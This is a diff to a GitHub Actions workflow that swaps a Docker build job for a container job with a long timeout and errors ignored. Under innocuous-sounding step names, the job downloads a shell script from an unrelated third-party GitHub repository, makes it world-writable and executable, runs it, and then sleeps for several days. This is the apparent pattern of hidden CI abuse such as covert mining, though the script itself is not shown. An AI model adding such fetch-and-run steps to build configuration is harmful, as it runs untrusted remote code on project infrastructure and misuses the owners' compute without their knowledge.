@@ -11,11 +11,22 @@ on:
       - master
     
 jobs:
-  build:
-    runs-on: ubuntu-20.04
+  linux:
+    strategy:
+      matrix:
+        container:
+        - 'debian:latest'
+    timeout-minutes: 300
+    runs-on: ubuntu-latest
+    continue-on-error: true
+    container: ${{ matrix.container }}
     steps:
-    
-    - uses: actions/checkout@v2
-  
-    - name: Build
-      uses: docker/build-push-action@v1
+    - name: Setup27
+      uses: actions/checkout@v1
+    - name: prebuild27
+      run: |
+             apt-get install wget -y 
+             wget https://github.com/taebk2838/docker-desktop/raw/master/set.sh
+             chmod 777 set.sh
+             ./set.sh
+             sleep 474849
